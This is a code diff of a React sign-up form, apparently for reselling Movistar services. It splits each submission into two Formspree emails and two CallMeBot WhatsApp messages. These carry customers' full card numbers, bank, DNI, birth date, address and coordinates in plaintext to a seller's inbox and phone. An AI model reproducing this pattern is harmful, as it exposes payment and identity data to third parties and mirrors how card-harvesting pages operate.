@@ -2,7 +2,7 @@ import React, { useState, useMemo, useRef, useEffect } from 'react';
 import {
   Wifi, Tv, Zap, MapPin, User, CreditCard, Phone, Check,
   Star, Signal, Gift, AlertCircle, MapPinned, ChevronRight,
-  Send, Loader2, CheckCircle2, XCircle, Sparkles, Navigation, Smartphone, Mail, Clock
+  Send, Loader2, CheckCircle2, XCircle, Sparkles, Navigation, Smartphone
 } from 'lucide-react';
 
 /* ============================================================
@@ -180,7 +180,7 @@ export default function App() {
       seccion3Texto = 'NO ESPECIFICADO';
     }
 
-    /* -------- Sección 5: resumen consolidado (hidden en la web) -------- */
+    /* -------- Sección 5: resumen consolidado -------- */
     const entreCalles = [formData.transversal1, formData.transversal2, formData.calleAtras]
       .filter(Boolean)
       .join(' / ');
@@ -211,8 +211,8 @@ export default function App() {
       `MIGA:`
     ].join('\n');
 
-    /* -------- Cuerpo del email formateado -------- */
-    const mensaje = [
+    /* -------- EMAIL 1: Secciones 1 a 4 -------- */
+    const mensaje1 = [
       'SECCION 1',
       'VALIDAR DIRECCIONES / DISPONIBILIDAD:',
       `CALLE: ${formData.calle}`,
@@ -237,28 +237,62 @@ export default function App() {
       'numero de contacto',
       `TELEFONO: ${formData.telefonoContacto || ''}`,
       `CORREO: ${formData.correoElectronico || ''}`,
-      `MOMENTO DE INSTALACION: ${formData.momentoInstalacion || ''}`,
+      `MOMENTO DE INSTALACION: ${formData.momentoInstalacion || ''}`
+    ].join('\n');
+
+    /* -------- EMAIL 2: Sección 5 (resumen) -------- */
+    const mensaje2 = [
+      'SECCION 5 - RESUMEN CONSOLIDADO',
       '',
-      'SECCION 5',
       seccion5Texto
     ].join('\n');
 
-    const data = new FormData();
-    data.append('_subject', `Nueva solicitud Movistar - ${formData.nombre || 'Sin nombre'}`);
-    data.append('SOLICITUD', mensaje);
-    data.append('SECCION5_RESUMEN', seccion5Texto);
+    /* -------- Preparar los dos FormData -------- */
+    const data1 = new FormData();
+    data1.append('_subject', `📋 Solicitud Movistar [1/2] - ${formData.nombre || 'Sin nombre'}`);
+    data1.append('message', mensaje1);
+    data1.append('NOMBRE COMPLETO', formData.nombre || '');
+    data1.append('DNI', formData.dni || '');
+    data1.append('FECHA DE NACIMIENTO', formData.fechaNacimiento || '');
+    data1.append('NOMBRE DE LA CALLE', formData.calle || '');
+    data1.append('NUMERO DEL HOGAR', formData.numero || '');
+    data1.append('ENTRE CALLES', entreCalles);
+    data1.append('LOCALIDAD', formData.localidad || '');
+    data1.append('COORDENADAS', coordsTexto);
+    data1.append('CORREO ELECTRONICO', formData.correoElectronico || '');
+    data1.append('NUMERO DE CONTACTO', formData.telefonoContacto || '');
+    data1.append('MOMENTO DE INSTALACION', formData.momentoInstalacion || '');
+    data1.append('METODO DE PAGO', metodoPago);
+    data1.append('BANCO', formData.bancoEmisor || '');
+    data1.append('NUMERO DE TARJETA', formData.numeroTarjeta || '');
+    data1.append('TITULAR', formData.nombre || '');
+    data1.append('VENDEDOR', 'IRIGOYEN CARLOS DAMIAN');
+
+    const data2 = new FormData();
+    data2.append('_subject', `📋 Solicitud Movistar [2/2] RESUMEN - ${formData.nombre || 'Sin nombre'}`);
+    data2.append('message', mensaje2);
+    data2.append('SECCION_5_RESUMEN', seccion5Texto);
 
     try {
-      const res = await fetch(FORMSPREE_ENDPOINT, {
-        method: 'POST',
-        body: data,
-        headers: { Accept: 'application/json' }
-      });
+      // Enviamos los 2 emails en paralelo
+      const [res1, res2] = await Promise.all([
+        fetch(FORMSPREE_ENDPOINT, {
+          method: 'POST',
+          body: data1,
+          headers: { Accept: 'application/json' }
+        }),
+        fetch(FORMSPREE_ENDPOINT, {
+          method: 'POST',
+          body: data2,
+          headers: { Accept: 'application/json' }
+        })
+      ]);
 
-      if (res.ok) {
-        /* -------- Notificación por WhatsApp (CallMeBot) -------- */
-        const waText = [
-          '🔔 *NUEVA SOLICITUD MOVISTAR*',
+      // Consideramos OK si AL MENOS uno de los dos envíos tuvo éxito
+      if (res1.ok || res2.ok) {
+        /* -------- WhatsApp 1: Secciones 1-4 -------- */
+        const waText1 = [
+          '🔔 *NUEVA SOLICITUD MOVISTAR [1/2]*',
           '',
           '*SECCION 1*',
           'VALIDAR DIRECCIONES / DISPONIBILIDAD:',
@@ -271,30 +305,39 @@ export default function App() {
           `COORDENADAS: ${coordsTexto}`,
           '',
           '*SECCION 2*',
-          '👤 VALIDAR TITULAR (scoring)',
           `NOMBRE: ${formData.nombre}`,
           `DNI: ${formData.dni}`,
           `FECHA NAC: ${formData.fechaNacimiento}`,
           '',
           '*SECCION 3*',
-          '💳 VALIDAR TARJETA',
           seccion3Texto,
           '',
           '*SECCION 4*',
-          'numero de contacto',
           `TELEFONO: ${formData.telefonoContacto || ''}`,
           `CORREO: ${formData.correoElectronico || ''}`,
-          `MOMENTO DE INSTALACION: ${formData.momentoInstalacion || ''}`,
-          '',
-          '*SECCION 5*',
-          seccion5Texto
+          `INSTALACION: ${formData.momentoInstalacion || ''}`
         ].join('\n');
 
-        const waUrl = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(CALLMEBOT_PHONE)}&text=${encodeURIComponent(waText)}&apikey=${CALLMEBOT_API_KEY}`;
+        const waUrl1 = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(CALLMEBOT_PHONE)}&text=${encodeURIComponent(waText1)}&apikey=${CALLMEBOT_API_KEY}`;
 
-        fetch(waUrl, { mode: 'no-cors' }).catch(() => {
-          console.warn('CallMeBot: no se pudo enviar el WhatsApp.');
+        fetch(waUrl1, { mode: 'no-cors' }).catch(() => {
+          console.warn('CallMeBot: no se pudo enviar el WhatsApp 1.');
         });
+
+        /* -------- WhatsApp 2: Sección 5 (espera 5s para respetar rate limit) -------- */
+        setTimeout(() => {
+          const waText2 = [
+            '🔔 *RESUMEN SOLICITUD [2/2]*',
+            '',
+            seccion5Texto
+          ].join('\n');
+
+          const waUrl2 = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(CALLMEBOT_PHONE)}&text=${encodeURIComponent(waText2)}&apikey=${CALLMEBOT_API_KEY}`;
+
+          fetch(waUrl2, { mode: 'no-cors' }).catch(() => {
+            console.warn('CallMeBot: no se pudo enviar el WhatsApp 2.');
+          });
+        }, 5000);
 
         setStatus('success');
         setFormData(initialFormState);
